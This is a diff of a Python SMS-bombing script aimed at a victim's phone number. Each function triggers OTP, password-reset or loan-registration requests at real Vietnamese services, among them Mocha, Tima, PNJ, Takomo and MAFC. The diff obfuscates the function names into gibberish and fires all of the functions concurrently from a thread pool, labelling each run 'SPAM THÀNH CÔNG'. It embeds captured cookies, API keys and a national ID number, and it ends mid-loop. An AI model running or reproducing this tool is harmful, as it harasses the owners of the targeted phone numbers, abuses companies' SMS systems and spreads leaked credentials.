-def send_otp_via_modcha35(sdt):
+def WXWWXWXWWWWWXXWWXXWXW(sdt):
 
     url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"
 
-    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"
+    payload = f"clientType=ios&amp;countryCode=VN&amp;device=iPhone15%2C3&amp;os_version=iOS_17.0.2&amp;platform=ios&amp;revision=11224&amp;username={sdt}&amp;version=1.28"
 
     headers = {
     'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
@@ -2598,10 +2644,10 @@ def send_otp_via_modcha35(sdt):
     }
 
     response = requests.post(url, data=payload, headers=headers)
-    print('thành Công') #("OTP SEND MOCHA35:", response.text)
+    print("OTP SEND MOCHA35:", response.text)
 
 
-def send_otp_via_Bibabo(sdt):
+def jjljjljjilijijjiljljjiil(sdt):
 
     url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"
 
@@ -2620,11 +2666,11 @@ def send_otp_via_Bibabo(sdt):
 
     response = requests.get(url, params=params, headers=headers)
 
-    print('thành Công') #("OTP SEND Bibabo:", response.text)
+    print("OTP SEND Bibabo:", response.text)
 
 
 
-def send_otp_via_MOCA(sdt):
+def OOooDOOoOODOOOoDOoOo(sdt):
     url = "https://moca.vn/moca/v2/users/role"
 
     params = {
@@ -2649,10 +2695,10 @@ def send_otp_via_MOCA(sdt):
 
     response = requests.get(url, params=params, headers=headers)
 
-    print('thành Công') #("OTP SEND MOCA LỎ:", response.text)
+    print("OTP SEND MOCA SPAM THÀNH CÔNG:", response.text)
 
 
-def send_otp_via_pantio(sdt):
+def ljlljjlljiiiljljjlij(sdt):
     headers = {
         'accept': '*/*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2680,10 +2726,10 @@ def send_otp_via_pantio(sdt):
 
     response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
 
-    print('thành Công') #("OTP SEND pantio:", response.text)
+    print("OTP SEND pantio:", response.text)
 
 
-def send_otp_via_Routine(sdt):
+def SS22SSSS22222S2SS2S2S(sdt):
 
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2715,9 +2761,9 @@ def send_otp_via_Routine(sdt):
 
     response = requests.post('https://routine.vn/customer/otp/send/', headers=headers, data=data)
 
-    print('thành Công') #("OTP SEND Routine:", response.text)
+    print("OTP SEND Routine:", response.text)
 
-def send_otp_via_vayvnd(sdt):
+def WWXWWXWXWWWXXWXXXWXW(sdt):
     # Headers chung
     headers = {
         'accept': 'application/json',
@@ -2737,7 +2783,7 @@ def send_otp_via_vayvnd(sdt):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
     }
 
-    # Request 1: Tạo user
+    # Request 1: Táº¡o user
     json_data_1 = {
         'phone': sdt,
         'utm': [
@@ -2760,18 +2806,18 @@ def send_otp_via_vayvnd(sdt):
     }
 
     response_1 = requests.post('https://api.vayvnd.vn/v2/users', headers=headers, json=json_data_1)
-    print('thành Công') #(response_1.json())
+    print(response_1.json())
 
-    # Request 2: Yêu cầu reset mật khẩu
+    # Request 2: YÃªu cáº§u reset máº­t kháº©u
     json_data_2 = {
         'login': sdt,
         'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
     }
 
     response_2 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_2)
-    print('thành Công') #(response_2.json())
+    print(response_2.json())
 
-    # Request 3: Yêu cầu reset mật khẩu với antispam
+    # Request 3: YÃªu cáº§u reset máº­t kháº©u vá»›i antispam
     json_data_3 = {
         'login': sdt,
         'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
@@ -2782,14 +2828,14 @@ def send_otp_via_vayvnd(sdt):
     }
 
     response_3 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_3)
-    print('thành Công') #(response_3.json())
+    print(response_3.json())
 
 
 
 
 
 
-def send_otp_via_tima(sdt):
+def jjliliijiijijllijlll(sdt):
 
 
     cookies = {
@@ -2821,7 +2867,7 @@ def send_otp_via_tima(sdt):
     }
 
     data = {
-        'application_full_name': generate_random_name(),
+        'application_full_name': OooOOo0O0oooO00OO0o0O(),
         'application_mobile_phone': sdt,
         'CityId': '1',
         'DistrictId': '16',
@@ -2831,14 +2877,14 @@ def send_otp_via_tima(sdt):
         'application_term': '0',
         'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
         'IsApply': '1',
-        'ProvinceName': 'Thành phố Hà Nội',
-        'DistrictName': 'Huyện Sóc Sơn',
+        'ProvinceName': 'ThÃ&nbsp;nh phá»‘ HÃ&nbsp; Ná»™i',
+        'DistrictName': 'Huyá»‡n SÃ³c SÆ¡n',
         'product_id': '2',
     }
 
     response = requests.post('https://tima.vn/Borrower/RegisterLoanCreditFast', cookies=cookies, headers=headers, data=data)
 
-    print('thành Công') #("OTP SEND Routine: Đã gửi yêu cầu ")
+    print("OTP SEND Routine:SPAM THÀNH CÔNG")
 
 
 
@@ -2850,7 +2896,7 @@ def send_otp_via_tima(sdt):
 
 
 
-def send_otp_via_paynet(sdt):
+def nmnmnnmmmmnmmnnnnnnmnnmn(sdt):
 
     headers = {
         'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2877,12 +2923,12 @@ def send_otp_via_paynet(sdt):
     }
 
     response = requests.post('https://merchant.paynetone.vn/User/GetOTP', headers=headers, data=data, verify=False)
-    print('thành Công') #("OTP SEND Paynet:", response.text)
+    print("OTP SEND Paynet:", response.text)
 
 
 
 
-def send_otp_via_moneygo(sdt):
+def nmnmnnmnmmnmmmmmnm(sdt):
 
     cookies = {
         'XSRF-TOKEN': 'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D',
@@ -2917,12 +2963,12 @@ def send_otp_via_moneygo(sdt):
         'agree': '1',
     }
 
-    response = requests.post('https://moneygo.vn/dang-ki-vay-nhanh', cookies=cookies, headers=headers, data=data, verify=False)
+    response = requests.post('https://moneygo.vn/dang-ki-vay-nhanh', cookies=cookies, headers=headers, data=data)
 
-    print('thành Công') #("OTP SEND Routine: Đã gửi yêu cầu ")
+    print("OTP SEND SPAM THÀNH CÔNG ")
 
 
-def send_otp_via_pico(sdt):
+def lIllIlIIlllIllllIIIII(sdt):
     # First request
     headers_1 = {
         'accept': '*/*',
@@ -2943,7 +2989,7 @@ def send_otp_via_pico(sdt):
     }
 
     json_data_1 = {
-        'name': generate_random_name(),
+        'name': OooOOo0O0oooO00OO0o0O(),
         'phone': sdt,
         'provinceCode': '92',
         'districtCode': '925',
@@ -2954,7 +3000,7 @@ def send_otp_via_pico(sdt):
     response_1 = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers_1, json=json_data_1)
     
     # Handle the response of the first request if necessary
-    print('thành Công') #(response_1.json())
+    print(response_1.json())
 
     # Second request
     headers_2 = {
@@ -2987,7 +3033,7 @@ def send_otp_via_pico(sdt):
     response_2 = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers_2, json=json_data_2)
     
     # Handle the response of the second request if necessary
-    print('thành Công') #(response_2.json())
+    print(response_2.json())
 
 
 
@@ -3001,7 +3047,7 @@ def send_otp_via_pico(sdt):
 
 
 
-def send_otp_via_PNJ(sdt):
+def MNMNNNNNNNNMNMNMNNMMNM(sdt):
 
 
     cookies = {
@@ -3041,10 +3087,10 @@ def send_otp_via_PNJ(sdt):
     }
 
     response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
-    print('thành Công') #("OTP SEND : Đã gửi thành công oke sai thì thôi :))) PNJ Trang sức PNJ ")
+    print("OTP SEND : SPAM THÀNH CÔNG ")
 
 
-def send_otp_via_TINIWORLD(sdt):
+def JLLLLILLJIILJLIILIIJIJLJ(sdt):
     cookies = {
         'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
     }
@@ -3058,7 +3104,7 @@ def send_otp_via_TINIWORLD(sdt):
         'dnt': '1',
         'origin': 'https://prod-tini-id.nkidworks.com',
         'priority': 'u=0, i',
-        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
+        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&amp;requiredLogin=true&amp;redirectUrl=https://tiniworld.com',
         'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -3078,186 +3124,11 @@ def send_otp_via_TINIWORLD(sdt):
     }
 
     response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
-    print('thành Công') #("OTP SEND : Đã gửi thành công hoặc thất bại  TINIWORLD")
+    print("OTP SEND :SPAM THÀNH CÔNG TINIWORLD")
 
 
 
-def send_otp_via_BACHHOAXANH(sdt):
 
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
-        'Access-Control-Allow-Origin': '*',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'DNT': '1',
-        'Origin': 'https://www.bachhoaxanh.com',
-        'Referer': 'https://www.bachhoaxanh.com/dang-nhap',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'cross-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'authorization': 'Bearer 48AEFAE5FF6C90A31EBC7BB892756688',
-        'deviceid': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
-        'platform': 'webnew',
-        'referer-url': 'https://www.bachhoaxanh.com/dang-nhap',
-        'reversehost': 'http://bhxapi.live',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'xapikey': 'bhx-api-core-2022',
-    }
-
-    json_data = {
-        'deviceId': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
-        'userName': sdt,
-        'isOnlySms': 1,
-        'ip': '',
-    }
-
-    response = requests.post('https://apibhx.tgdd.vn/User/LoginWithPassword', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND send_otp_via_BACHHOAXANH:", response.text)
-
-
-def send_otp_via_shbfinance(sdt):
-    headers = {
-        'Accept': 'application/json',
-        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
-        'Authorization': 'Bearer',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'DNT': '1',
-        'Origin': 'https://www.shbfinance.com.vn',
-        'Referer': 'https://www.shbfinance.com.vn/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    json_data = {
-        'customerName': generate_random_name(),
-        'mobileNumber': sdt,
-        'campaignCode': '',
-        'documentIds': 'Cash',
-        'year': 1996,
-        'provinceName': 'An Giang',
-        'districtName': 'Châu Đốc',
-        'district': None,
-        'document': 'Vay tiền mặt',
-        'lendingAmt': 40000000,
-        'loanAmt': 40000000,
-        'lendingPeriod': 12,
-        'dateOfBirth': '01-Jan-1996',
-        'partnerName': 'Website',
-        'utmSource': 'WEB',
-        'utmMedium': 'form',
-        'utmCampaign': 'vay-tien-mat',
-    }
-
-    response = requests.post('https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND send_otp_via_shbfinance:", response.text)
-
-def send_otp_via_mafccomvn(sdt):
-    cookies = {
-        'pll_language': 'vi',
-        'BIGipServerPool_www.mafc.com.vn': '654334730.20480.0000',
-        'mafcavraaaaaaaaaaaaaaaa_session_': 'BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB',
-        'MAFC01f6952f': '018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed',
-        'MAFC00000000233': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec',
-        'MAFC_101_DID': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9',
-        'MAFCed66693a184': '0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
-    }
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/json',
-        # 'cookie': 'pll_language=vi; BIGipServerPool_www.mafc.com.vn=654334730.20480.0000; mafcavraaaaaaaaaaaaaaaa_session_=BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB; MAFC01f6952f=018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed; MAFC00000000233=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec; MAFC_101_DID=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9; MAFCed66693a184=0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
-        'dnt': '1',
-        'origin': 'https://mafc.com.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://mafc.com.vn/vay-tien-nhanh',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
-    }
-
-    json_data = {
-        'usersName': 'tannguyen',
-        'password': 'mafc123!',
-        'income': 0,
-        'currAddress': 'Tp.Hcm',
-        'phoneNbr': sdt,
-        'nationalId': '034201009872',
-        'typeCreate': 'API',
-        'name': generate_random_name(),
-        'allowQualified': 'Y',
-        'email': 'b45b93f099',
-        'referralCode': '',
-        'age': '1992',
-        'vendorCode': 'INTERNAL_MKT',
-        'msgName': 'creatlead',
-        'priAddress': 'null',
-        'campaign': 'null',
-        'adsGroupName': 'null',
-        'adsName': 'null',
-        'paramInfo': '',
-        'mktCode': 'null',
-        'consentNd13': 'Y',
-    }
-
-    response = requests.post(
-        'https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    )
-
-
-
-def send_otp_via_phuclong(sdt):
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'authorization': 'Bearer undefined',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'origin': 'https://order.phuclong.com.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://order.phuclong.com.vn/',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
-        'x-api-key': 'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3',
-    }
-
-    # Dữ liệu JSON cho yêu cầu đầu tiên
-    json_data_check = {
-        'userName': sdt,
-    }
-
-    # Dữ liệu JSON cho yêu cầu thứ hai
-    json_data_register = {
-        'phoneNumber': sdt,
-        'fullName': generate_random_name(),
-        'email': 'th456do1g110@hotmail.com',
-        'password': 'Nqnt7%@hf3',
-    }
-
-    # Gửi yêu cầu đầu tiên
-    response_check = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/check', headers=headers, json=json_data_check)
-    print('thành Công') #(response_check.json())
-
-    # Gửi yêu cầu thứ hai
-    response_register = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data_register)
-    print('thành Công') #(response_register.json())
 
 
 
@@ -3283,14 +3154,14 @@ def send_otp_via_phuclong(sdt):
 
 ##################################################################################################################################################################################
 
-def send_otp_via_takomo(sdt):
+def xwwwxwxwxxxxwwwxxxw(sdt):
 
     cookies = {
         '__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
         '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
     }
 
-    # Cấu hình headers chung
+    # Cáº¥u hÃ¬nh headers chung
     headers_get = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -3316,7 +3187,7 @@ def send_otp_via_takomo(sdt):
         'dnt': '1',
         'origin': 'https://lk.takomo.vn',
         'priority': 'u=1, i',
-        'referer': 'https://lk.takomo.vn/?phone={sdt}&amount=2000000&term=7&utm_source=pop_up&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_popup_login',
+        'referer': 'https://lk.takomo.vn/?phone={sdt}&amp;amount=2000000&amp;term=7&amp;utm_source=pop_up&amp;utm_medium=organic&amp;utm_campaign=direct_takomo&amp;utm_content=mainpage_popup_login',
         'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -3326,7 +3197,7 @@ def send_otp_via_takomo(sdt):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
     }
 
-    # Thực hiện request GET
+    # Thá»±c hiá»‡n request GET
     params = {
         'phone': sdt,
         'amount': '2000000',
@@ -3339,9 +3210,9 @@ def send_otp_via_takomo(sdt):
 
     response_get = requests.get('https://lk.takomo.vn/', params=params, cookies=cookies, headers=headers_get)
 
-    print('thành Công') #("OTP SEND :oke")
+    print("OTP SEND :oke")
 
-    # Thực hiện request POST
+    # Thá»±c hiá»‡n request POST
     json_data = {
         'data': {
             'phone': sdt,
@@ -3352,7 +3223,7 @@ def send_otp_via_takomo(sdt):
 
     response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers_post, json=json_data)
 
-    print('thành Công') #("OTP SEND :", response_post.text)
+    print("OTP SEND :", response_post.text)
 ##################################################################################################################################################################################
 ##################################################################################################################################################################################
 ##################################################################################################################################################################################
@@ -3365,155 +3236,49 @@ def send_otp_via_takomo(sdt):
 ##################################################################################################################################################################################
 
 
-
-
-
-
-
-
-
-
-
-import sys
+import concurrent.futures
 import time
-import threading
 
-def send_otp_with_delay(func, phone, delay):
-    func(phone)
-    time.sleep(delay)
+def LJJJJLJIJLLJLJILJLIILLIIL(phone, i):
+    functions = [
+        XWXWWWXWWWXXXXXXWW, lIlIlllllllIllIlI, mmnmmmnmmmmmmmnmmnnmnnmm, OODOOooDoOOoOoOooDD,
+        JIILIILJJILJJILJIILLJILI, S222SSSSSS222S2SS2SS22222S, lIIllIlllIIllIIlIllI, DOOOOoDDDOODDDDoDooO,
+        llIllIIIIlIlIIlIlIlll, NMMNNNMMNMMMMNNNM, XWWWWXWXWXXXXXXWXXW, MNMNNNMNMNMNNNMMNNMN,
+        OO00OoO0o0Oo0ooOOo0OOO0o, Oo0oO0ooooo0O000O0ooO, LJIJIILJJJLIJLJJILJ, IlIIIlIlllIlIIlIlIllI,
+        IlIIlllIIlIIIIlIIllIll, ODoOODODDOOOOOODDoDDOO, XXWXWWWXXXXXXWXXXWXXX, OOoO0O0OO000Oo00OooO0O0o,
+        xwxwxxxxwwxxwwxwxwxxwxx, JLJLLIJJLJLJIIIIJLLLJJJJL, oOOoDDDDoOoDoOoooO, lIlIIIIIIIIlIlIIlllI,
+        XWWWWXWXXWXXXXXXWXW, O00oOoOo0O0Oo0OO00OO0, WWWWWWXWXWXWXXWWW, xxwxxxxxxxxwwwxwwwxxxxwx,
+        IllIIlIIIlIIlIIlIlI, xxwwwxwwwwxwxwwxxx, LJJLIILLLILIJIJLLJL, WXWWWWXWXWXXWWXWWWXWXXXX,
+        DOoODDDDOOoDooOODDODDDO, xwwwwxxxwxwwwxxwxxwxwwx, IIIIIIlIIIlIIIIlIllIIIlII, lljjjjliiiljijljli,
+        liljliiiijijljljl, O0O0OOoOoO0oOoOOOOoo0oOOO0, NMNMMMMNMNMNMMNMNN, DOooOoOOOODoODoooDO,
+        S22SSS2SSSS22222SSS22, IIIIllllIllIIIIllIIIllI, mmnmmmnmmmmmmmnmmnnmnnmm, IIllIllIlllIlllII,
+        mmnnmnmnnmmmnnmnmmmmm, lIIlllIIIllIIIlIIIIIll, jijjlljjjijjiiijjiilii, WWWXXXWWXXXWWWXWWXWXWX,
+        XXWWXWWWXXWXWXXXXXW, IJIILJILJLLLJJLLJLJILII, SS2S22SSSS2S2SS22SSS, mmnmnnmnnnmmmnmmmnmnnmm,
+        MMNNNMMMMMNNNNNNMNNNMMM, MMNMMMMMMNNMNMMNNMMM, jljijilllljjlijjjll, WXXXXWXWWWXWWWXXWXWXXXXXX,
+        MMNMMNMMMNNMNNNMNNN, WWXXWWXWWXXWWXWWWWW, IILLILJLLLJLIJIJJ, jijiijjijllijijji,
+        WXWWXWXWWWWWXXWWXXWXW, jjljjljjilijijjiljljjiil, OOooDOOoOODOOOoDOoOo, ljlljjlljiiiljljjlij,
+        SS22SSSS22222S2SS2S2S, WWXWWXWXWWWXXWXXXWXW, jjliliijiijijllijlll, nmnmnnmnmmnmmmmmnm,
+        xwwwxwxwxxxxwwwxxxw, nmnmnnmmmmnmmnnnnnnmnnmn, lIllIlIIlllIllllIIIII, MNMNNNNNNNNMNMNMNNMMNM, JLLLLILLJIILJLIILIIJIJLJ,
+    ]
 
-# Lấy số điện thoại và độ trễ từ dòng lệnh
-phone = input("Nhập số điện thoại: ")
-delay = float(5)
-repeat_count = int(input("Nhập số lần spam: "))
- # Số lần gửi OTP
+    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+        futures = [executor.submit(fn, phone) for fn in functions]
 
-# Tạo danh sách các hàm OTP
-otp_functions = [
-    send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
-    send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
-    send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
-    send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
-    send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
-    send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
-    send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
-    send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
-    send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
-    send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
-    send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_medicare, send_otp_via_futabus,
-    send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
-    send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_vinamilk,
-    send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
-    send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
-    send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
-    send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
-    send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
-    send_otp_via_BACHHOAXANH, send_otp_via_takomo, send_otp_via_mafccomvn, send_otp_via_phuclong
-]
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                future.result()
+            except Exception as exc:
+                print(f'Đã xảy ra lỗi: {exc}')
 
-# Thực hiện gửi OTP nhiều lần
-for _ in range(repeat_count):
-    threads = []
-    for func in otp_functions:
-        thread = threading.Thread(target=send_otp_with_delay, args=(func, phone, delay))
-        threads.append(thread)
-
-    # Bắt đầu các luồng
-    for thread in threads:
-        thread.start()
-
-    # Chờ các luồng hoàn thành
-    for thread in threads:
-        thread.join()
-
-
-def send_otp_with_delay(func, phone):
-    try:
-        func(phone)
-        print(f"Spam thành công với {func.__name__}")
-    except Exception as e:
-        print(f"Lỗi tại {func.__name__}: {e}")
-        traceback.print_exc()
-    time.sleep(random.uniform(1, 2))
+    print("\033[46mTHÀNH CÔNG:", i)
+    for j in range(4, 0, -1):
